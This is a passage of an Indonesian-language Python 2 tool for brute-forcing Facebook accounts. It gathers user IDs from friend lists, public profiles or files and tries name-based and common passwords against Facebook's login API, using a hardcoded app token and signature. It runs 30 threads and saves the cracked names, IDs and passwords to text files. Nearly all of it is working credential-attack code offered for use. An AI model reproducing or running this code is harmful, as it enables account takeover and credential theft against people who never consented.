											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/indo.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('Bangsat')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/indo.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/indo.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = ('Anjing')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/indo.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/indo.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = ('Kontol')
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/indo.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/indo.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'12345'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/indo.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/indo.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone Indo.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
##### CRACK BANGLADESH #####
def crack_bangla():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;92m _________   ________.    "
	print "\033[1;92m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;91m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;92m  \______  /|__|   |___  /"
	print "\033[1;92m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m───────────────────\033[1;97m(\033[1;93mBangladesh\033[1;97m)\033[1;94m────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_bangla()

#### PILIH BANGLADESH ####
def pilih_bangla():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_bangla()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;92m _________   ________.    "
		print "\033[1;92m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;91m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;92m  \______  /|__|   |___  /"
		print "\033[1;92m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK BANGLADESH \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;92m _________   ________.    "
		print "\033[1;92m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;91m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;92m  \______  /|__|   |___  /"
		print "\033[1;92m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK BANGLADESH \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idb = raw_input("\033[1;97m(\033[1;94m•\033[1;97m)\033[1;97m ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idb+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m)\033[1;97m Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik tidak ada !"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_bangla()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idb+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;92m _________   ________.    "
		print "\033[1;92m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;91m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;92m  \______  /|__|   |___  /"
		print "\033[1;92m         \/            \/ "
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;94m>>> \033[1;93mCRACK BANGLADESH \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m)\033[1;97m Nama File \033[1;91m:\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali\033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_bangla()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_bangla()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN BANGLADESH #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/bangla.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/bangla.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/bangla.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/bangla.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/bangla.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/bangla.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['first_name'].lower()+'12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/bangla.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/bangla.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('102030')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/bangla.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/bangla.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = ('786786')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/bangla.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/bangla.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = ('102030')
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/bangla.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/bangla.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'123'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/bangla.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
